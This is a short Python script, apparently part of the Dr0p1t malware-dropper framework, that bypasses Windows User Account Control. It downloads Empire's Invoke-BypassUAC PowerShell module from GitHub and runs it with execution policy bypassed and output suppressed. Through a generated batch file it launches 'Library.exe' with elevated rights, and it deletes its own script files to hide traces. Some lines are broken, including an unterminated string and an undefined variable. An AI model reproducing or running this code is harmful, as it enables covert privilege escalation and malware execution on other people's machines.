#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This script aims to bypass UAC by Invoke-BypassUAC function from PowerSploit (¯\_(ツ)_/¯)
#Start

def runas():
	pscode  = '(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1","$pwd\Lolz.ps1")'
	pscode += "\nfunction SelfDestruct() {"+"\n"
	pscode += "$path = (Get-Variable MyInvocation -Scope 1).Value.MyCommand.Path"+"\n"
	pscode += "Clear-Content $path"+"\n"
	pscode += "Remove-Item $path}"+"\n"
	pscode += "SelfDestruct"+"\n
	f=open("Lol.ps1","w");f.write(pscode);f.close()
	blah = subprocess.Popen("PowerShell.exe -ExecutionPolicy Bypass -noprofile -File lol.ps1 >> NUL",shell=True)
	filename = pth.split("\\")[-1]
	data = '''@echo off
powershell -noprofile -Command "Import-Module .\Lolz.ps1 ; Invoke-BypassUAC -Command 'Library.exe' "
break>Lolz.ps1 && DEL "Lolz.ps1"
break>"%~f0" && DEL "%~f0"'''
	f = open("yourock.bat","w")
	f.write(data)
	f.close()
	blah = subprocess.Popen("yourock.bat >> NUL",shell=True)

runas()
